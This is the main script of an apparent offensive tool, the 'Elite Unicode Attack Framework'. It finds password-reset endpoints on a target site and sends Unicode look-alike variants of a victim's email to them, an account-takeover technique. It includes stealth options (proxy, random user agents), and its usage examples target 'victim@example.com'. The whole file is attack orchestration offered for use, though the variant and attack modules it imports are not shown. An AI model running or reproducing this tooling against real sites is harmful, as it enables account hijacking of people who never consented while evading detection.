#!/usr/bin/env python3
"""
Elite Unicode Attack Framework v3.0
Professional Unicode Exploitation Tool for Bug Bounty Hunters

Author: Elite Security Research Team
License: MIT (For Authorized Testing Only)
"""

import sys
import asyncio
import argparse
from pathlib import Path
from datetime import datetime

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from colorama import Fore, Style, init
from core.logger import init_logging, get_logger, log_banner
from core.config import AttackConfig
from core.utils import validate_url, validate_email, normalize_url, format_duration
from modules.variant_engine import VariantEngine
from modules.attack_executor import AttackExecutor
from modules.scanner import VulnerabilityScanner
from modules.reporter import Reporter

# Initialize colorama
init(autoreset=True)

# Get logger
logger = get_logger("Main")


class EliteUnicodeFramework:
    """Main framework orchestrator"""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.logger = logger
        self.variant_engine = VariantEngine()
        self.attack_executor = AttackExecutor(config)
        self.scanner = VulnerabilityScanner(config.target_url)
        self.reporter = Reporter(config.output_dir)
        self.start_time = datetime.now()
    
    async def run_full_assessment(self) -> dict:
        """
        Execute complete security assessment
        
        Returns:
            Dictionary with all results
        """
        self.logger.info("=" * 70)
        self.logger.info("Starting Elite Unicode Attack Framework v3.0")
        self.logger.info("=" * 70)
        
        results = {
            'target': self.config.target_url,
            'email': self.config.target_email,
            'timestamp': self.start_time.isoformat(),
            'scan_results': {},
            'variants': [],
            'attack_results': [],
            'statistics': {},
        }
        
        # Phase 1: Reconnaissance
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Phase 1: Target Reconnaissance{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        self.logger.info("Executing vulnerability scan...")
        scan_results = await self.scanner.scan_full()
        results['scan_results'] = scan_results
        
        self._print_scan_summary(scan_results)
        
        # Phase 2: Variant Generation
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Phase 2: Unicode Variant Generation{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        self.logger.info("Generating email variants...")
        variants = self.variant_engine.generate_all_variants(
            self.config.target_email,
            max_variants=self.config.max_variants
        )
        results['variants'] = [vars(v) for v in variants]
        
        variant_stats = self.variant_engine.get_variant_stats(variants)
        self._print_variant_summary(variant_stats)
        
        # Phase 3: Attack Execution
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Phase 3: Attack Execution{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        # Get endpoints from scan
        endpoints = scan_results.get('forgot_password_endpoints', [])
        
        if not endpoints:
            self.logger.warning("No password reset endpoints found, using default")
            endpoints = ['/forgot-password', '/password/reset']
        
        self.logger.info(f"Executing attacks against {len(endpoints)} endpoints...")
        print(f"{Fore.CYAN}[*] Testing {len(variants)} variants × {len(endpoints)} endpoints{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Total attacks: {len(variants) * len(endpoints)}{Style.RESET_ALL}\n")
        
        attack_results = await self.attack_executor.execute_attack_campaign(variants, endpoints)
        results['attack_results'] = self.attack_executor.export_results()
        
        # Phase 4: Analysis
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Phase 4: Results Analysis{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
        
        statistics = self.attack_executor.get_statistics()
        results['statistics'] = statistics
        
        self._print_attack_summary(statistics)
        
        # Phase 5: Report Generation
        if self.config.generate_report:
            print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Phase 5: Report Generation{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
            
            self._generate_reports(results)
        
        # Final summary
        duration = (datetime.now() - self.start_time).total_seconds()
        
        print(f"\n{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{Style.BRIGHT}✓ Assessment Complete{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Duration:{Style.RESET_ALL} {format_duration(duration)}")
        print(f"{Fore.YELLOW}Total Attacks:{Style.RESET_ALL} {statistics.get('total_attacks', 0)}")
        print(f"{Fore.YELLOW}Successful:{Style.RESET_ALL} {statistics.get('successful', 0)}")
        print(f"{Fore.YELLOW}Success Rate:{Style.RESET_ALL} {statistics.get('success_rate', 0):.2f}%\n")
        
        return results
    
    def _print_scan_summary(self, scan_results: dict):
        """Print scan results summary"""
        endpoints = scan_results.get('forgot_password_endpoints', [])
        oauth = scan_results.get('oauth_providers', {})
        tech = scan_results.get('technology_stack', {})
        
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Password Reset Endpoints: {Fore.CYAN}{len(endpoints)}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} OAuth Providers: {Fore.CYAN}{len(oauth)}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Server: {Fore.CYAN}{tech.get('server', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Framework: {Fore.CYAN}{tech.get('framework', 'Unknown')}{Style.RESET_ALL}")
        
        if endpoints:
            print(f"\n{Fore.YELLOW}Discovered Endpoints:{Style.RESET_ALL}")
            for ep in endpoints[:5]:
                print(f"  • {ep}")
            if len(endpoints) > 5:
                print(f"  ... and {len(endpoints)-5} more")
    
    def _print_variant_summary(self, stats: dict):
        """Print variant generation summary"""
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Total Variants: {Fore.CYAN}{stats.get('total', 0)}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Avg Similarity: {Fore.CYAN}{stats.get('avg_similarity', 0):.2%}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Unicode Points: {Fore.CYAN}{stats.get('unique_unicode_points', 0)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Variants by Technique:{Style.RESET_ALL}")
        for technique, count in stats.get('by_technique', {}).items():
            print(f"  • {technique.replace('_', ' ').title()}: {count}")
    
    def _print_attack_summary(self, statistics: dict):
        """Print attack execution summary"""
        total = statistics.get('total_attacks', 0)
        successful = statistics.get('successful', 0)
        failed = statistics.get('failed', 0)
        success_rate = statistics.get('success_rate', 0)
        
        color = Fore.GREEN if success_rate > 10 else Fore.YELLOW if success_rate > 0 else Fore.RED
        
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Total Attacks: {Fore.CYAN}{total}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Successful: {color}{successful}{Style.RESET_ALL}")
        print(f"{Fore.RED}✗{Style.RESET_ALL} Failed: {Fore.CYAN}{failed}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Success Rate: {color}{success_rate:.2f}%{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} Avg Response Time: {Fore.CYAN}{statistics.get('avg_response_time', 0):.2f}s{Style.RESET_ALL}")
        
        # Success by technique
        by_technique = statistics.get('by_technique', {})
        if by_technique:
            print(f"\n{Fore.YELLOW}Success by Technique:{Style.RESET_ALL}")
            for technique, stats in by_technique.items():
                success = stats['success']
                total_tech = stats['total']
                rate = (success / total_tech * 100) if total_tech > 0 else 0
                print(f"  • {technique.title()}: {success}/{total_tech} ({rate:.1f}%)")
    
    def _generate_reports(self, results: dict):
        """Generate all report formats"""
        self.logger.info("Generating reports...")
        
        # HTML Report
        html_path = self.reporter.generate_html_report(results)
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} HTML Report: {Fore.CYAN}{html_path}{Style.RESET_ALL}")
        
        # JSON Report
        json_path = self.reporter.generate_json_report(results)
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} JSON Report: {Fore.CYAN}{json_path}{Style.RESET_ALL}")
        
        # CSV Report
        csv_path = self.reporter.generate_csv_report(results['attack_results'])
        print(f"{Fore.GREEN}✓{Style.RESET_ALL} CSV Report: {Fore.CYAN}{csv_path}{Style.RESET_ALL}")


def create_parser() -> argparse.ArgumentParser:
    """Create command-line argument parser"""
    parser = argparse.ArgumentParser(
        description="Elite Unicode Attack Framework v3.0 - Professional Security Assessment",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full assessment
  python main.py -t https://example.com -e victim@example.com
  
  # Custom configuration
  python main.py -t https://example.com -e victim@example.com --threads 10 --delay 2
  
  # Stealth mode with proxy
  python main.py -t https://example.com -e victim@example.com --stealth --proxy http://proxy:8080
  
  # Generate only variants
  python main.py -e victim@example.com --variants-only

For more information: https://github.com/elite-unicode-framework
        """
    )
    
    # Required arguments
    parser.add_argument('-t', '--target', type=str, help='Target URL (required for full scan)')
    parser.add_argument('-e', '--email', type=str, required=True, help='Target email address')
    
    # Attack configuration
    attack = parser.add_argument_group('Attack Configuration')
    attack.add_argument('--threads', type=int, default=5, help='Number of threads (default: 5)')
    attack.add_argument('--delay', type=float, default=1.0, help='Delay between requests (default: 1.0)')
    attack.add_argument('--timeout', type=int, default=30, help='Request timeout (default: 30)')
    attack.add_argument('--max-variants', type=int, default=100, help='Max variants to generate (default: 100)')
    
    # Stealth options
    stealth = parser.add_argument_group('Stealth Options')
    stealth.add_argument('--stealth', action='store_true', help='Enable stealth mode')
    stealth.add_argument('--proxy', type=str, help='Proxy URL (http://proxy:port)')
    stealth.add_argument('--random-ua', action='store_true', help='Use random user agents')
    
    # Output options
    output = parser.add_argument_group('Output Options')
    output.add_argument('-o', '--output', type=str, default='results', help='Output directory (default: results)')
    output.add_argument('--no-report', action='store_true', help='Disable report generation')
    output.add_argument('--format', choices=['html', 'json', 'csv', 'all'], default='all', help='Report format')
    
    # Modes
    modes = parser.add_argument_group('Modes')
    modes.add_argument('--variants-only', action='store_true', help='Generate variants only (no attack)')
    modes.add_argument('--scan-only', action='store_true', help='Scan target only (no attack)')
    
    # Other
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    parser.add_argument('--quiet', action='store_true', help='Suppress banner')
    parser.add_argument('--version', action='version', version='Elite Unicode Framework v3.0')
    
    return parser


async def main():
    """Main entry point"""
    parser = create_parser()
    args = parser.parse_args()
    
    # Initialize logging
    log_level = 10 if args.verbose else 20  # DEBUG if verbose, else INFO
    init_logging(level=log_level)
    
    # Show banner
    if not args.quiet:
        log_banner()
    
    try:
        # Validate inputs
        if not validate_email(args.email):
            print(f"{Fore.RED}✗ Invalid email format: {args.email}{Style.RESET_ALL}\n")
            return 1
        
        # Variants-only mode
        if args.variants_only:
            logger.info("Running in variants-only mode")
            variant_engine = VariantEngine()
            variants = variant_engine.generate_all_variants(args.email, max_variants=args.max_variants)
            
            print(f"\n{Fore.GREEN}✓ Generated {len(variants)} variants:{Style.RESET_ALL}\n")
            for i, variant in enumerate(variants[:20], 1):
                print(f"{i:3d}. {variant.variant} ({variant.technique})")
            
            if len(variants) > 20:
                print(f"\n... and {len(variants)-20} more variants")
            
            return 0
        
        # Full assessment mode requires target
        if not args.target:
            print(f"{Fore.RED}✗ Target URL is required for full assessment{Style.RESET_ALL}\n")
            parser.print_help()
            return 1
        
        if not validate_url(args.target):
            print(f"{Fore.RED}✗ Invalid URL format: {args.target}{Style.RESET_ALL}\n")
            return 1
        
        # Normalize target URL
        target_url = normalize_url(args.target)
        
        # Create configuration
        config = AttackConfig(
            target_url=target_url,
            target_email=args.email,
            threads=args.threads,
            delay=args.delay,
            timeout=args.timeout,
            stealth_mode=args.stealth,
            random_user_agents=args.random_ua,
            proxy=args.proxy,
            max_variants=args.max_variants,
            output_dir=Path(args.output),
            generate_report=not args.no_report,
            report_format=args.format,
        )
        
        # Validate configuration
        if not config.validate():
            print(f"{Fore.RED}✗ Invalid configuration{Style.RESET_ALL}\n")
            return 1
        
        # Scan-only mode
        if args.scan_only:
            logger.info("Running in scan-only mode")
            scanner = VulnerabilityScanner(target_url)
            scan_results = await scanner.scan_full()
            
            print(f"\n{Fore.GREEN}Scan Results:{Style.RESET_ALL}\n")
            print(f"Endpoints: {len(scan_results.get('forgot_password_endpoints', []))}")
            print(f"OAuth: {len(scan_results.get('oauth_providers', {}))}")
            print(f"Server: {scan_results.get('technology_stack', {}).get('server', 'Unknown')}")
            
            return 0
        
        # Run full assessment
        framework = EliteUnicodeFramework(config)
        await framework.run_full_assessment()
        
        return 0
    
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}⚠ Assessment interrupted by user{Style.RESET_ALL}\n")
        return 130
    
    except Exception as e:
        logger.error(f"Critical error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
